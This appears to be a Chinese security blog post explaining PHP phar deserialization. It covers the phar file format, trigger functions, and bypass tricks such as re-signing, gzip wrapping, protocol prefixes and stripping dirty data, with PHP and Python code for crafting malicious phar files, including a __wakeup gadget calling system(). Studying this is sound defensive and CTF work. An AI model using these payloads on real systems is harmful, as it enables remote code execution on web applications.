<!DOCTYPE html>
<html lang="en" color-mode="light">
  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <meta name="author" content="John Doe" />
  <meta name="description" content="" />
  
  
  <title>
    
      php反序列化--phar篇 
      
      
      |
    
     Prove yourself
  </title>

  
    <link rel="apple-touch-icon" href="/images/myblog.ico">
    <link rel="icon" href="/images/myblog.ico">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/me.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Aecous</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">php反序列化--phar篇</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2023-08-29 19:40:44
        </span>
        
      </div>
      <div class="markdown-body">
        <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958">https://xz.aliyun.com/t/2958</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/16786627.html">https://www.cnblogs.com/CoLo/p/16786627.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-3">https://xz.aliyun.com/t/6699#toc-3</a><br><a target="_blank" rel="noopener" href="https://boogipop.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">https://boogipop.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>想要知道为什么使用phar协议去读取phar文件会触发反序列化，需要先来了解一些前置知识。<br>看一眼phar文件的组成，这是翻译过的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692090608330-b95b2228-805e-4cc8-9b04-937bdd88cf48.png#averageHue=%23ededed&clientId=u315db56c-005c-4&from=paste&height=419&id=u30e7f439&originHeight=628&originWidth=1400&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65177&status=done&style=none&taskId=u42d412c9-ffd9-4539-a718-3d057b4ef90&title=&width=933.3333333333334" alt="image.png"><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.ingredients.php">https://www.php.net/manual/zh/phar.fileformat.ingredients.php</a></p>
<h4 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692090717377-53ae8aae-c51b-4052-85b6-2312e59f7c3f.png#averageHue=%23edecec&clientId=u315db56c-005c-4&from=paste&height=605&id=u932530a3&originHeight=908&originWidth=1661&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=105394&status=done&style=none&taskId=u916f9e08-bfbd-43a8-9a89-744ebc212d7&title=&width=1107.3333333333333" alt="image.png"><br>stub就是</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>一个phar文件必须要有此标识符，否则无法识别成phar</p>
<h4 id="manifest-describing-the-contents"><a href="#manifest-describing-the-contents" class="headerlink" title="manifest describing the contents"></a>manifest describing the contents</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692090307218-0e048eb5-693a-4ed9-9a1b-81644895ad60.png#averageHue=%23e3e2e1&clientId=u315db56c-005c-4&from=paste&height=599&id=u80135b23&originHeight=898&originWidth=1701&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=208680&status=done&style=none&taskId=u19e6be33-740c-462a-b34d-2fa19a818e5&title=&width=1134" alt="image.png"><br>内容本质上还是压缩文件，其中包含一些压缩信息，以及我们写入的序列化数据</p>
<h4 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h4><p>这里指的是被压缩文件的内容；</p>
<h4 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a><strong>[optional] a signature for verifying Phar integrity (phar file format only)</strong></h4><p>phar文件的签名<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692091372930-662702ff-b8fd-4ae7-ba80-acad1f85d869.png#averageHue=%23e8e7e6&clientId=u315db56c-005c-4&from=paste&height=503&id=u3791880f&originHeight=754&originWidth=1652&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=161744&status=done&style=none&taskId=u3aecb55a-25a8-43b1-896c-90419f66b06&title=&width=1101.3333333333333" alt="image.png"><br>签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密<br>不过通常用的都是sha1啊，当文件内容被修改时，就需要重新签名</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">from hashlib import sha1
with <span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>
    f <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment"># 获取要签名的数据</span>
h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># 获取签名类型和GBMB标识</span>
newf <span class="token operator">=</span> s <span class="token operator">+</span> <span class="token function">sha1</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> h <span class="token comment"># 数据 + 签名 + (类型 + GBMB)</span>
with <span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'newtest.phar'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>
    file<span class="token operator">.</span><span class="token function">write</span><span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment"># 写入新文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>

    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest,也就是将序列化数据写入文件</span>

    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
    <span class="token comment">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意点：php.ini中的phar.readonly要为off</p>
<p>当使用一些文件读取函数去配合phar协议读取phar文件时，即会触发phar反序列化，具体的流程大概是，识别到了phar头，进入处理phar文件的环节，PHP使用phar_parse_metadata在解析meta数据时，会调用php_var_unserialize进行反序列化操作。<br>这个要去看php底层源码，我不会欸，以后学了再来补。</p>
<h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><h4 id="一些常规函数"><a href="#一些常规函数" class="headerlink" title="一些常规函数"></a>一些常规函数</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692091702924-27fe5a9c-8fca-484f-be47-907c9c19afef.png#averageHue=%23f4f5f2&clientId=u315db56c-005c-4&from=paste&height=266&id=u9e864e85&originHeight=399&originWidth=1259&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=107369&status=done&style=none&taskId=u5ff3fd5e-a890-4621-a78f-50a6f89e511&title=&width=839.3333333333334" alt="image.png"></p>
<h4 id="Stream-API"><a href="#Stream-API" class="headerlink" title="Stream API"></a>Stream API</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958">https://xz.aliyun.com/t/2958</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">stream <span class="token operator">=</span> <span class="token function">php_stream_open_wrapper_ex</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">,</span>
                <span class="token punctuation">(</span>use_include_path <span class="token operator">?</span> <span class="token constant">USE_PATH</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token class-name">REPORT_ERRORS</span><span class="token punctuation">,</span>
                <span class="token constant">NULL</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>可以注意，其使用的是php_stream系列API来打开一个文件。阅读PHP的这篇文档：<a target="_blank" rel="noopener" href="https://secure.php.net/manual/zh/internals2.ze1.streams.php">Streams API for PHP Extension Authors</a>，可知，Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。而本次事件的主角，也就是phar这个扩展，其就注册了phar:&#x2F;&#x2F;这个stream wrapper。可以使用stream_get_wrapper看到系统内注册了哪一些wrapper，但其余的没什么值得关注的。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">></span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">stream_get_wrappers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"https"</span>
  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"ftps"</span>
  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"compress.zlib"</span>
  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"compress.bzip2"</span>
  <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"php"</span>
  <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"file"</span>
  <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"glob"</span>
  <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"data"</span>
  <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"http"</span>
  <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"ftp"</span>
  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"phar"</span>
  <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">=></span>
  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"zip"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>因此，我们发现，一个 stream wrapper，它支持以下功能：打开文件（夹）、删除文件（夹）、重命名文件（夹），以及获取文件的meta。我们很容易就能断定，类似unlink等函数也是同样通过这个 streams api 进行操作。</p>
</blockquote>
<p>下面就是一些php代码调试的一些函数，我就不太懂了，我这边就直接记录一下结果把</p>
<h4 id="exif"><a href="#exif" class="headerlink" title="exif"></a>exif</h4><ul>
<li>exif_thumbnail</li>
<li>exif_imagetype</li>
</ul>
<h4 id="gd"><a href="#gd" class="headerlink" title="gd"></a>gd</h4><ul>
<li>imageloadfont</li>
<li>imagecreatefrom***</li>
</ul>
<h4 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h4><ul>
<li>hash_hmac_file</li>
<li>hash_file</li>
<li>hash_update_file</li>
<li>md5_file</li>
<li>sha1_file</li>
</ul>
<h4 id="file-x2F-url"><a href="#file-x2F-url" class="headerlink" title="file &#x2F; url"></a>file &#x2F; url</h4><ul>
<li>get_meta_tags</li>
<li>get_headers</li>
</ul>
<h4 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h4><ul>
<li>getimagesize</li>
<li>getimagesizefromstring</li>
</ul>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。</p>
<h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><p>Mysql的load data local infile也会触发php_stream_open_wrapper</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">mysqli_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysqli_options</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token constant">MYSQLI_OPT_LOCAL_INFILE</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">mysqli_real_connect</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'easyweb'</span><span class="token punctuation">,</span> <span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="基础bypass"><a href="#基础bypass" class="headerlink" title="基础bypass"></a>基础bypass</h4><p>这里就大概讲一下，当ban了phar文件后缀时，可以直接对后缀进行更改，不影响phar协议的读取，因为他是通过数据中的stub头来判断的</p>
<p>如果ban了stub头，那么可以将phar文件进行一次压缩，建议使用linux的自带压缩gzip，使用windows的bandzip等会导致算法问题无法触发</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">gzip <span class="token number">1.</span>zip <span class="token number">1.</span>phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>配合phar:&#x2F;&#x2F;1.zip&#x2F;1.phar</p>
<p>如果不允许以phar协议开头，那么可以带个其他协议</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//phar://phar.phar/test.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h4 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h4><p>通过010去修改其属性值，并用脚本重新签名</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">from hashlib <span class="token keyword">import</span> sha1
file <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  # 需要重新生成签名的phar文件


data <span class="token operator">=</span> file<span class="token punctuation">[</span><span class="token operator">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>  # 获取需要签名的据
final <span class="token operator">=</span> file<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token operator">:</span><span class="token punctuation">]</span>  # 获取最后<span class="token number">8</span>位<span class="token constant">GBMB</span>标识和签名类型
newfile <span class="token operator">=</span> data <span class="token operator">+</span> <span class="token function">sha1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> final  # 数据 <span class="token operator">+</span> 签名 <span class="token operator">+</span> 类型 <span class="token operator">+</span> <span class="token constant">GBMB</span>
<span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'poc.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>newfile<span class="token punctuation">)</span>  # 写入到新的phar文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<h4 id="phar脏数据绕过"><a href="#phar脏数据绕过" class="headerlink" title="phar脏数据绕过"></a>phar脏数据绕过</h4><p>懒，纯纯复制pop爷博客</p>
<h5 id="绕过头部脏数据"><a href="#绕过头部脏数据" class="headerlink" title="绕过头部脏数据"></a>绕过头部脏数据</h5><p>当文件上传之后，在文件数据前面拼接了脏数据，再进行文件函数配合phar协议读取时，就会因为签名原因导致无法反序列化，这种情况下，就需要在生成phar文件时，将已知的脏数据设置在stub中，计算完签名后将文件中的脏数据删除即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//前面的脏数据</span>
<span class="token variable">$dirtydata</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//在stub头中添加脏数据</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token variable">$dirtydata</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//添加压缩文件</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"anything"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//自动计算签名</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//读取phar文件</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$post_exp</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$dirtydata</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//删除脏数据头</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./break_phar.phar"</span><span class="token punctuation">,</span><span class="token variable">$post_exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试</p>
